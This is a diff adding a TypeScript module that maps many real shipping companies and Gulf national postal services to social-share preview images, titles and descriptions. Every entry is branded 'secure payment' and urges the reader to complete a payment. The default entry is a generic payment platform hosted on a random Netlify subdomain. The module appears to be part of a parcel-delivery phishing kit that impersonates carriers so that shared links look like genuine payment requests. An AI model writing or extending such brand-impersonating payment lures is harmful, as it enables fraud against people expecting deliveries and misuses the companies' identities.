@@ -1,0 +1,192 @@
+/**
+ * Enhanced Company Metadata Mapping
+ * Maps each company to their specific OG meta tags for social sharing
+ * تحديث ديناميكي للصورة والعنوان والوصف حسب الشركة
+ */
+
+export interface CompanyMeta {
+  image: string;
+  title: string;
+  description: string;
+}
+
+const companyMetaMap: Record<string, CompanyMeta> = {
+  // UAE - الإمارات
+  aramex: {
+    image: "/og-aramex.jpg",
+    title: "دفع آمن - أرامكس للشحن السريع 🚚",
+    description: "خدمات شحن عالمية مع أرامكس - أكمل عملية الدفع بأمان تام للحصول على خدمات شحن سريعة وموثوقة في جميع أنحاء الخليج والعالم ✅"
+  },
+  dhl: {
+    image: "/og-dhl.jpg",
+    title: "دفع آمن - DHL الشحن العالمي السريع ⚡",
+    description: "DHL - الشبكة العالمية الأكبر للشحن السريع - أكمل دفعتك بأمان للحصول على خدمات توصيل سريعة وموثوقة إلى أي مكان في العالم 🌍"
+  },
+  fedex: {
+    image: "/og-fedex.jpg",
+    title: "دفع آمن - FedEx الشحن الدولي الموثوق 📦",
+    description: "FedEx - رائدة الشحن الدولي - ادفع بأمان واحصل على خدمات شحن موثوقة مع تتبع فوري وضمان الوصول في الموعد المحدد ⏰"
+  },
+  ups: {
+    image: "/og-ups.jpg",
+    title: "دفع آمن - UPS للشحن والتوصيل العالمي 🌐",
+    description: "UPS - حلول لوجستية متكاملة - أكمل الدفع بأمان للحصول على خدمات شحن عالمية احترافية مع تغطية شاملة وتتبع دقيق 📍"
+  },
+  empost: {
+    image: "/og-empost.jpg",
+    title: "دفع آمن - البريد الإماراتي 🇦🇪",
+    description: "البريد الإماراتي الرسمي - خدمات بريدية وشحن متميزة - ادفع بأمان واستمتع بخدمات الشحن المحلية والدولية الموثوقة ✨"
+  },
+
+  // Saudi Arabia - السعودية
+  smsa: {
+    image: "/og-smsa.jpg",
+    title: "دفع آمن - SMSA Express سمسا إكسبرس 🚛",
+    description: "SMSA Express - الرائدة في الشحن السعودي - أكمل الدفع بأمان للحصول على خدمات توصيل سريعة في جميع أنحاء المملكة 🇸🇦"
+  },
+  zajil: {
+    image: "/og-zajil.jpg",
+    title: "دفع آمن - زاجل للشحن السريع 📮",
+    description: "زاجل - شحن سريع وموثوق في السعودية - ادفع بأمان واحصل على خدمات توصيل احترافية مع تغطية شاملة لكل المناطق 🇸🇦"
+  },
+  naqel: {
+    image: "/og-naqel.jpg",
+    title: "دفع آمن - ناقل إكسبريس للشحن 🚚",
+    description: "ناقل إكسبريس - خدمات شحن متطورة - أكمل دفعتك بأمان للحصول على توصيل سريع وآمن لجميع مدن ومناطق المملكة ⚡"
+  },
+  saudipost: {
+    image: "/og-saudipost.jpg",
+    title: "دفع آمن - البريد السعودي 🇸🇦",
+    description: "البريد السعودي الرسمي - خدمات بريدية وشحن موثوقة - ادفع بأمان واستفد من شبكة التوزيع الأوسع في المملكة 📦"
+  },
+
+  // Kuwait - الكويت
+  kwpost: {
+    image: "/og-kwpost.jpg",
+    title: "دفع آمن - البريد الكويتي 🇰🇼",
+    description: "البريد الكويتي الرسمي - خدمات بريدية وشحن متميزة - أكمل الدفع بأمان للحصول على خدمات توصيل محلية ودولية موثوقة ✅"
+  },
+
+  // Qatar - قطر
+  qpost: {
+    image: "/og-qpost.jpg",
+    title: "دفع آمن - البريد القطري 🇶🇦",
+    description: "البريد القطري الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واستمتع بخدمات توصيل سريعة وآمنة في قطر والعالم 🌍"
+  },
+
+  // Oman - عمان
+  omanpost: {
+    image: "/og-omanpost.jpg",
+    title: "دفع آمن - البريد العُماني 🇴🇲",
+    description: "البريد العُماني الرسمي - خدمات بريدية وشحن موثوقة - أكمل دفعتك بأمان للحصول على خدمات توصيل محلية ودولية متميزة 📮"
+  },
+
+  // Bahrain - البحرين
+  bahpost: {
+    image: "/og-bahpost.jpg",
+    title: "دفع آمن - البريد البحريني 🇧🇭",
+    description: "البريد البحريني الرسمي - خدمات بريدية وشحن احترافية - ادفع بأمان واحصل على خدمات توصيل سريعة وموثوقة في البحرين والعالم ✨"
+  },
+
+  // Additional Companies
+  jinakum: {
+    image: "/og-jinakum.jpg",
+    title: "دفع آمن - جينا كم للشحن 📦",
+    description: "جينا كم - حلول شحن مبتكرة في الخليج - أكمل الدفع بأمان للحصول على خدمات لوجستية متطورة وتوصيل سريع 🚚"
+  },
+  jinaken: {
+    image: "/og-jinaken.jpg",
+    title: "دفع آمن - جيناكوم للشحن 🚛",
+    description: "جيناكوم - خدمات شحن عُمانية متميزة - ادفع بأمان واستفد من شبكة توزيع واسعة وخدمات توصيل موثوقة في عُمان 🇴🇲"
+  },
+  genacom: {
+    image: "/og-genacom.jpg",
+    title: "دفع آمن - جيناكوم للشحن 📮",
+    description: "جيناكوم - شحن سريع وآمن - أكمل دفعتك بأمان للحصول على خدمات لوجستية احترافية مع تتبع فوري للشحنات 📍"
+  },
+  albaraka: {
+    image: "/og-albaraka.jpg",
+    title: "دفع آمن - البركة للشحن 🌟",
+    description: "البركة للشحن - خدمات لوجستية متكاملة في الخليج - ادفع بأمان واحصل على حلول شحن احترافية وموثوقة ✅"
+  },
+  alfuttaim: {
+    image: "/og-alfuttaim.jpg",
+    title: "دفع آمن - الفطيم للخدمات اللوجستية 🏢",
+    description: "مجموعة الفطيم - حلول لوجستية عالمية - أكمل الدفع بأمان للحصول على خدمات شحن وتوزيع احترافية في المنطقة 🌐"
+  },
+  alshaya: {
+    image: "/og-alshaya.jpg",
+    title: "دفع آمن - الشايع للخدمات اللوجستية 📦",
+    description: "مجموعة الشايع - شبكة توزيع واسعة - ادفع بأمان واستفد من خدمات شحن احترافية وحلول لوجستية متطورة 🚚"
+  },
+  shipco: {
+    image: "/og-shipco.jpg",
+    title: "دفع آمن - شيبكو للشحن الدولي 🚢",
+    description: "شيبكو - شحن بحري وجوي وبري - أكمل دفعتك بأمان للحصول على خدمات نقل دولية شاملة مع حلول لوجستية متكاملة 🌍"
+  },
+  bahri: {
+    image: "/og-bahri.jpg",
+    title: "دفع آمن - بحري للنقل البحري ⚓",
+    description: "بحري السعودية - رائدة النقل البحري - ادفع بأمان واحصل على خدمات شحن بحرية احترافية وحلول لوجستية متطورة 🚢"
+  },
+  hellmann: {
+    image: "/og-hellmann.jpg",
+    title: "دفع آمن - هيلمان العالمية 🌐",
+    description: "هيلمان - خدمات لوجستية عالمية - أكمل الدفع بأمان للحصول على حلول شحن دولية احترافية مع تغطية عالمية شاملة ✈️"
+  },
+  dsv: {
+    image: "/og-dsv.jpg",
+    title: "دفع آمن - DSV اللوجستية العالمية 📦",
+    description: "DSV - شبكة لوجستية عالمية - ادفع بأمان واستفد من حلول نقل وشحن دولية متكاملة مع خدمات احترافية 🌍"
+  },
+  agility: {
+    image: "/og-agility-temp.jpg",
+    title: "دفع آمن - أجيليتي للخدمات اللوجستية 🚚",
+    description: "أجيليتي - حلول سلسلة التوريد - أكمل دفعتك بأمان للحصول على خدمات لوجستية متكاملة في الخليج والعالم 🌐"
+  },
+
+  // Default fallback
+  default: {
+    image: "/og-aramex.jpg",
+    title: "دفع آمن - منصة الدفع الموحدة 💳",
+    description: "نظام دفع إلكتروني آمن ومحمي بتشفير SSL - أكمل معاملاتك المالية بكل ثقة وأمان مع حماية كاملة لبياناتك 🔒✅"
+  }
+};
+
+/**
+ * Get absolute URL for image
+ */
+function getAbsoluteImageUrl(imagePath: string): string {
+  if (imagePath.startsWith('http')) {
+    return imagePath;
+  }
+  
+  const productionDomain = typeof window !== 'undefined'
+    ? window.location.origin
+    : (import.meta.env.VITE_PRODUCTION_DOMAIN || 'https://sensational-fenglisu-ebbbfb.netlify.app');
+  
+  return `${productionDomain}${imagePath}`;
+}
+
+/**
+ * Get company metadata with fallback and absolute URLs
+ * @param companyKey - Company identifier (e.g., 'dhl', 'aramex')
+ * @returns Company metadata object with absolute image URL
+ */
+export const getCompanyMeta = (companyKey: string): CompanyMeta => {
+  if (!companyKey) {
+    const defaultMeta = companyMetaMap.default;
+    return {
+      ...defaultMeta,
+      image: getAbsoluteImageUrl(defaultMeta.image)
+    };
+  }
+
+  const key = companyKey.toLowerCase();
+  const meta = companyMetaMap[key] || companyMetaMap.default;
+  
+  return {
+    ...meta,
+    image: getAbsoluteImageUrl(meta.image)
+  };
+};
